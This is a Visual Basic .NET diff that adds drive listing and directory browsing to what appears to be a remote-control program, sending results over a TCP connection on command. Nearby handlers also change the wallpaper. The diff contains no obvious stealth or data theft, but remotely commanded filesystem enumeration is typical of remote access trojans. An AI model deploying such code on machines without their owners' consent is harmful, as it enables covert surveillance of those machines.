@@ -253,9 +253,76 @@ Public Class Form1
 
         MonClient.GetStream().Write(buffer, 0, buffer.Length)
         TextBox1.Text = String.Empty
+
+        GetVolume()
+    End Sub
+
+    Public Sub NewVolFile(ByVal NewP As String)
+        Dim Path = NewP
+
+        Dim ListOfGarbage As New StringBuilder
+
+
+        For Each yu In Directory.GetFiles(Path, "*.*", SearchOption.TopDirectoryOnly)
+
+
+            Dim MyNameIsWhat = IO.Path.GetFileName(yu)
+
+
+
+            ListOfGarbage.AppendLine(MyNameIsWhat)
+
+
+
+
+        Next
+        ListOfGarbage.AppendLine("StopFilesNowDir")
+
+        For Each yu In Directory.GetDirectories(Path, "*.*", SearchOption.TopDirectoryOnly)
+
+            Dim MyNameIsWhat = IO.Path.GetFileName(yu)
+
+
+            ListOfGarbage.AppendLine(MyNameIsWhat)
+
+
+
+
+        Next
+
+        ListOfGarbage.Append("StopAllAndSendItRightNow")
+
+        ListOfGarbage.Append(Path)
+
+
+
+
+        Dim buffer() As Byte = Encoding.UTF8.GetBytes(ListOfGarbage.ToString)
+
+        MonClient.GetStream().Write(buffer, 0, buffer.Length)
+        TextBox1.Text = String.Empty
     End Sub
 
 
+    Public Sub GetVolume()
+
+        Dim kl As New StringBuilder
+        Dim allDrives() As DriveInfo = DriveInfo.GetDrives()
+        Dim d As DriveInfo
+        For Each d In allDrives
+            kl.AppendLine(d.Name)
+
+        Next
+        kl.Append("TheVolumeSir")
+
+        Dim buffer() As Byte = Encoding.UTF8.GetBytes(kl.ToString)
+
+        MonClient.GetStream().Write(buffer, 0, buffer.Length)
+        TextBox1.Text = String.Empty
+
+
+
+    End Sub
 
     Public Sub FileManagerGoForward(ByVal NewPath As String)
         Dim Path = NewPath
@@ -482,6 +549,13 @@ Public Class Form1
             '
             '
             '
+
+        ElseIf TextBox1.Text.StartsWith("TimetoChangeVolume\") Then
+
+            Dim jk As String = TextBox1.Text.Replace("TimetoChangeVolume\", "")
+
+            NewVolFile(jk)
+            '"TimetoChangeVolume\" + "\" +NewDrive
 
         ElseIf TextBox1.Text.EndsWith("SetWallpaperGoodSir") Then  ''WALLPAPER
 
